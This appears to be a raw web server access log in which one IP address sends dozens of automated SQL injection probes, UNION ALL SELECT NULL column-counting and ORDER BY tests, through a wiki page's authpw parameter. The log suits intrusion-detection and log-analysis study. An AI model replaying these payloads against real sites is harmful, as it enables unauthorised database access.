45.227.254.4 - - [11/Jan/2022:14:54:00 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20VTRI HTTP/1.1" 200 9468 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:00 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20fVmT HTTP/1.1" 200 9475 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:01 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20ORDER%20BY%201--%20vSkf HTTP/1.1" 200 9396 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:02 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20ORDER%20BY%203354--%20SdcO HTTP/1.1" 200 9399 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:02 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL--%20Goqs HTTP/1.1" 200 9409 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:03 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20BzoL HTTP/1.1" 200 9416 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:04 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20toFS HTTP/1.1" 200 9423 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:04 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20aQKg HTTP/1.1" 200 9430 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:05 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20YOsF HTTP/1.1" 200 9437 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:06 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20VxfY HTTP/1.1" 200 9444 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:06 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20NYJf HTTP/1.1" 200 9451 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:07 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20BtdA HTTP/1.1" 200 9458 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:08 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20mNFJ HTTP/1.1" 200 9465 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:08 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20lzJk HTTP/1.1" 200 9472 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:09 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20ORDER%20BY%201--%20Gopl HTTP/1.1" 200 9396 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:10 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20ORDER%20BY%206435--%20syVH HTTP/1.1" 200 9399 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:11 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL--%20pXlB HTTP/1.1" 200 9409 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:11 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20wLAo HTTP/1.1" 200 9416 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:12 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20CPIK HTTP/1.1" 200 9423 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:13 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20WzNJ HTTP/1.1" 200 9430 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:13 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20QNZO HTTP/1.1" 200 9437 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:14 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20HLHb HTTP/1.1" 200 9444 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:15 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20AocA HTTP/1.1" 200 9451 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:15 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20mQCc HTTP/1.1" 200 9458 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:16 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20uahC HTTP/1.1" 200 9465 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:17 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20gnvY HTTP/1.1" 200 9472 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:18 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20ORDER%20BY%201--%20SaSt HTTP/1.1" 200 9402 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:19 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20ORDER%20BY%205622--%20PfWR HTTP/1.1" 200 9405 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:19 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20UNION%20ALL%20SELECT%20NULL--%20gwwH HTTP/1.1" 200 9415 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:20 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20DVIH HTTP/1.1" 200 9422 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:21 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20xthx HTTP/1.1" 200 9429 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:21 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20OIhM HTTP/1.1" 200 9436 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:22 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20WFoU HTTP/1.1" 200 9443 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:23 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20eajt HTTP/1.1" 200 9450 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:24 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20bByw HTTP/1.1" 200 9457 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:24 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20zgDf HTTP/1.1" 200 9464 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:25 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20hyAR HTTP/1.1" 200 9471 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:26 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20lmHN HTTP/1.1" 200 9478 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:27 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20ORDER%20BY%201--%20Pblk HTTP/1.1" 200 9399 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:27 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20ORDER%20BY%203137--%20gPDw HTTP/1.1" 200 9402 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:28 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20UNION%20ALL%20SELECT%20NULL--%20nKnl HTTP/1.1" 200 9412 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:29 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20JrSP HTTP/1.1" 200 9419 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:29 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20dqBZ HTTP/1.1" 200 9426 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:30 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20FBjI HTTP/1.1" 200 9433 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:31 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20OXfY HTTP/1.1" 200 9440 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:31 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20Kegl HTTP/1.1" 200 9447 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:32 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20EEeh HTTP/1.1" 200 9454 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:33 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20pAJd HTTP/1.1" 200 9461 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:34 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20YXvG HTTP/1.1" 200 9468 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:34 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20OGVD HTTP/1.1" 200 9475 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:35 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20ORDER%20BY%201--%20WsxM HTTP/1.1" 200 9402 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:36 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20ORDER%20BY%201711--%20TzsR HTTP/1.1" 200 9405 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:37 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20UNION%20ALL%20SELECT%20NULL--%20QAOr HTTP/1.1" 200 9415 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:37 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20IrPm HTTP/1.1" 200 9422 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:38 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20Sxxf HTTP/1.1" 200 9429 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:39 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20PSwO HTTP/1.1" 200 9436 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:39 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20mVEs HTTP/1.1" 200 9443 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:40 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20hQAC HTTP/1.1" 200 9450 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:41 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20wAmi HTTP/1.1" 200 9457 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:42 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20Jveo HTTP/1.1" 200 9464 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:42 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20wTWy HTTP/1.1" 200 9471 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:43 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20VOhd HTTP/1.1" 200 9478 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:44 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20ORDER%20BY%201%23 HTTP/1.1" 200 9393 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:45 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20ORDER%20BY%209569%23 HTTP/1.1" 200 9396 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
